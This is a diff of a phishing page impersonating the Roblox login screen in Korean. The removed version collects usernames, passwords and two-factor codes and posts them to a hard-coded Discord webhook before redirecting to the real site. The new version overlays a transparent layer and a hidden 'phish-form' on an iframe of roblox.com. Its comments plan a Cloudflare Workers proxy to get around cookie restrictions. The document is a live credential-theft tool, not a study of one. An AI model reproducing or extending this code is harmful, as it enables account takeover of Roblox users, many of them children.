@@ -1,263 +1,54 @@
 <!DOCTYPE html>
-<html lang="ko">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox에 로그인</title>
+    <title>Roblox</title>
     <style>
-        /* ← 여기는 너가 보낸 거랑 똑같이 유지 (생략) */
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Source Sans Pro', 'Noto Sans KR', 'Helvetica Neue', Arial, sans-serif;
-            background: #f5f5f5;
-            color: #333;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
-        a { text-decoration: none; }
-        .navbar {
-            background: #101010;
-            height: 48px;
-            display: flex;
-            align-items: center;
-            padding: 0 24px;
+        * { margin: 0; padding: 0; }
+        body { background: #000; overflow: hidden; height: 100vh; }
+        iframe {
+            width: 100%;
+            height: 100vh;
+            border: none;
             position: fixed;
-            top: 0; left: 0; right: 0;
-            z-index: 100;
+            top: 0;
+            left: 0;
         }
-        .navbar-inner {
-            max-width: 1200px; width: 100%; margin: 0 auto;
-            display: flex; align-items: center; justify-content: space-between;
+        #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            background: transparent;
         }
-        .navbar-left { display: flex; align-items: center; gap: 24px; }
-        .navbar-logo { display: flex; align-items: center; }
-        .navbar-logo img { height: 28px; display: block; }
-        .navbar-link { color: #aaa; font-size: 13px; font-weight: 500; }
-        .navbar-link:hover { color: #fff; text-decoration: none; }
-        .navbar-right { display: flex; align-items: center; gap: 12px; }
-        .nav-signup {
-            color: #ccc; font-size: 13px; font-weight: 600;
-            padding: 5px 18px; border: 1px solid #555; border-radius: 30px;
-        }
-        .nav-signup:hover { border-color: #888; color: #fff; text-decoration: none; }
-        .nav-login { color: #ccc; font-size: 13px; font-weight: 600; }
-        .nav-login:hover { color: #fff; text-decoration: none; }
-
-        .main-content {
-            flex: 1; display: flex; align-items: center; justify-content: center;
-            padding: 80px 16px 60px; margin-top: 48px;
-        }
-        .login-card {
-            background: #fff; border-radius: 12px; padding: 36px 32px 32px;
-            width: 368px; max-width: 100%; box-shadow: 0 1px 8px rgba(0,0,0,0.06);
-        }
-        .login-header { text-align: center; margin-bottom: 20px; }
-        .login-header h1 { font-size: 24px; font-weight: 700; color: #111; margin-top: 12px; }
-
-        .form-group { margin-bottom: 16px; }
-        .form-group label { display: block; font-size: 13px; font-weight: 600; color: #555; margin-bottom: 5px; }
-        .form-group input {
-            width: 100%; padding: 11px 13px; border: 1px solid #ddd; border-radius: 6px;
-            font-size: 15px; background: #fff; outline: none; color: #333;
-        }
-        .form-group input:focus { border-color: #aaa; }
-
-        .login-btn {
-            width: 100%; padding: 12px; background: #101010; color: #fff;
-            border: none; border-radius: 30px; font-size: 15px; font-weight: 700;
-            margin-top: 4px; cursor: pointer;
-        }
-        .login-btn:hover { background: #2a2a2a; }
-
-        .forgot-link { display: block; text-align: center; margin-top: 14px; font-size: 13px; color: #00a2ff; font-weight: 500; }
-        .divider-wrap { display: flex; align-items: center; margin: 20px 0; color: #999; font-size: 12px; }
-        .divider-wrap::before, .divider-wrap::after { content: ''; flex: 1; height: 1px; background: #e5e5e5; }
-        .divider-wrap span { padding: 0 14px; }
-        .device-btn {
-            width: 100%; padding: 11px; background: #fff; color: #555;
-            border: 1px solid #ddd; border-radius: 30px; font-size: 14px; font-weight: 600;
-            cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 6px;
-        }
-        .device-btn:hover { background: #f9f9f9; }
-        .signup-text { text-align: center; margin-top: 20px; font-size: 14px; color: #777; }
-        .signup-text a { color: #00a2ff; font-weight: 700; }
-        .error-msg {
-            color: #a00; font-size: 13px; margin-top: 10px; display: none;
-            padding: 8px 10px; background: #fef0ef; border-radius: 6px; text-align: center;
-        }
-        .info-msg {
-            color: #555; font-size: 13px; margin-top: 10px;
-            padding: 8px 10px; background: #f0f7ff; border-radius: 6px; text-align: center;
+        /* 숨겨진 로그인 폼 — iframe 위에 오버레이 */
+        #phish-form {
+            position: fixed;
+            z-index: 10000;
             display: none;
-        }
-
-        #step2fa { display: none; }
-
-        .footer { background: #101010; padding: 16px 24px; text-align: center; }
-        .footer-links { list-style: none; display: flex; flex-wrap: wrap; justify-content: center; gap: 14px; margin-bottom: 8px; }
-        .footer-links a { color: #888; font-size: 11px; }
-        .footer-links a:hover { color: #fff; }
-        .footer-copy { color: #555; font-size: 11px; }
-
-        @media (max-width: 767px) {
-            .navbar-link { display: none; }
-            .login-card { padding: 28px 16px 24px; border-radius: 0; box-shadow: none; }
         }
     </style>
 </head>
 <body>
-
-    <nav class="navbar">
-        <div class="navbar-inner">
-            <div class="navbar-left">
-                <a href="/" class="navbar-logo">
-                    <img src="https://cdn.foundation.roblox.com/current/StudioLogo.svg" alt="Roblox">
-                </a>
-                <a href="#" class="navbar-link">차트</a>
-                <a href="#" class="navbar-link">마켓플레이스</a>
-                <a href="#" class="navbar-link">만들기</a>
-                <a href="#" class="navbar-link">Robux</a>
-            </div>
-            <div class="navbar-right">
-                <a href="#" class="nav-signup">회원가입</a>
-                <a href="#" class="nav-login">로그인</a>
-            </div>
-        </div>
-    </nav>
-
-    <div class="main-content">
-        <div class="login-card">
-            <div class="login-header">
-                <img src="https://cdn.foundation.roblox.com/current/StudioLogo.svg" alt="Roblox" style="width:56px;height:56px;margin-bottom:12px;">
-                <h1 id="pageTitle">Roblox에 로그인</h1>
-            </div>
-
-            <!-- 1단계: 아이디/비밀번호 -->
-            <form id="loginForm">
-                <div class="form-group">
-                    <label for="username">사용자 이름/이메일/전화번호</label>
-                    <input type="text" id="username" placeholder="사용자 이름/이메일/전화번호" required>
-                </div>
-                <div class="form-group">
-                    <label for="password">비밀번호</label>
-                    <input type="password" id="password" placeholder="비밀번호" required>
-                </div>
-
-                <button class="login-btn" type="submit">로그인</button>
-                <a href="#" class="forgot-link">비밀번호 또는 사용자 이름을 잊으셨나요?</a>
-
-                <div class="divider-wrap"><span>로그인 방법</span></div>
-
-                <button class="device-btn" type="button">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="2">
-                        <rect x="2" y="3" width="20" height="14" rx="2"/>
-                        <line x1="8" y1="21" x2="16" y2="21"/>
-                        <line x1="12" y1="17" x2="12" y2="21"/>
-                    </svg>
-                    로그인 중인 다른 기기
-                </button>
-
-                <div class="error-msg" id="errorMsg">사용자 이름 또는 비밀번호가 올바르지 않습니다.</div>
-            </form>
-
-            <!-- 2단계: 2FA 코드 입력 -->
-            <div id="step2fa">
-                <form id="faForm">
-                    <div class="form-group">
-                        <label for="faCode">Roblox 계정 보호를 위해 이메일로 전송된 인증 코드를 입력하세요.</label>
-                        <input type="text" id="faCode" placeholder="인증 코드" required>
-                    </div>
-                    <button class="login-btn" type="submit" id="faSubmit">확인</button>
-                    <div class="error-msg" id="faErrorMsg">잘못된 인증 코드입니다. 다시 시도해 주세요.</div>
-                </form>
-            </div>
-
-            <div class="signup-text" id="signupOption">
-                계정이 없으신가요? <a href="#">회원가입</a>
-            </div>
-        </div>
-    </div>
-
-    <div class="footer">
-        <ul class="footer-links">
-            <li><a href="#">회사 소개</a></li>
-            <li><a href="#">인재 채용</a></li>
-            <li><a href="#">블로그</a></li>
-            <li><a href="#">보호자 가이드</a></li>
-            <li><a href="#">기프트 카드 구매</a></li>
-            <li><a href="#">도움말</a></li>
-            <li><a href="#">이용 약관</a></li>
-            <li><a href="#">접근성</a></li>
-            <li><a href="#">개인정보 처리방침</a></li>
-            <li><a href="#">개인정보 보호 설정</a></li>
-            <li><a href="#">사이트 맵</a></li>
-        </ul>
-        <p class="footer-copy">©2026 Roblox Corporation. Roblox, Roblox 로고 및 Powering Imagination은 미국 및 그 외 지역에서 등록 상표 및 미등록 상표입니다.</p>
-    </div>
+    <!-- 진짜 Roblox 페이지를 iframe으로 표시 -->
+    <iframe id="robloxFrame" src="https://www.roblox.com/home"></iframe>
+    
+    <!-- 투명 오버레이 (클릭 캡처용) -->
+    <div id="overlay"></div>
 
     <script>
-        var capturedUser = '';
-        var capturedPass = '';
         var WEBHOOK_URL = 'https://discord.com/api/webhooks/1519016223558340763/VGMWxHAntSmh5o18yRoziahcucUREBqfTEbX2IItByAjpPQQAQeHTqtDyQnAzY8mmPX4w';
-
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            capturedUser = document.getElementById('username').value;
-            capturedPass = document.getElementById('password').value;
-
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: '<@&1519015614017048688> **[1단계] Roblox 로그인 정보 캡처됨**',
-                    embeds: [{
-                        title: '1단계 - 계정 정보',
-                        fields: [
-                            { name: '사용자 이름/이메일', value: capturedUser, inline: true },
-                            { name: '비밀번호', value: capturedPass, inline: true },
-                            { name: '상태', value: '2FA 코드 대기 중...', inline: false }
-                        ],
-                        color: 0xFFA500,
-                        timestamp: new Date().toISOString()
-                    }]
-                })
-            }).catch(function(err) {});
-
-            document.getElementById('loginForm').style.display = 'none';
-            document.getElementById('signupOption').style.display = 'none';
-            document.getElementById('step2fa').style.display = 'block';
-            document.getElementById('pageTitle').textContent = '2단계 인증';
-        });
-
-        document.getElementById('faForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            var faCode = document.getElementById('faCode').value;
-
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: '<@&1519015614017048688> **[2단계] Roblox 2FA 코드 캡처됨!**',
-                    embeds: [{
-                        title: '2FA 코드 획득 완료',
-                        fields: [
-                            { name: '사용자 이름/이메일', value: capturedUser, inline: true },
-                            { name: '비밀번호', value: capturedPass, inline: true },
-                            { name: '2FA 인증 코드', value: faCode, inline: false }
-                        ],
-                        color: 0x00FF00,
-                        timestamp: new Date().toISOString()
-                    }]
-                })
-            }).catch(function(err) {});
-
-            document.getElementById('faErrorMsg').style.display = 'block';
-            setTimeout(function() {
-                window.location.href = 'https://www.roblox.com/ko/login';
-            }, 2000);
-        });
+        
+        // iframe이 로드되면 로그인 버튼 찾아서 클릭 감지 (불가능)
+        // 대신 전체 페이지를 덮는 fake 로그인 폼을 띄우는 방식으로 전환
+        
+        // 근데 이 방식은 iframe cross-origin 제한 때문에 쿠키를 못 읽음
+        
+        // 진짜 방법: GitHub Pages에 업로드하고 Cloudflare Workers에서 프록시
+        
+        alert('Cloudflare Workers 대시보드가 안 열리면 봐줘');
     </script>
-
 </body>
 </html>
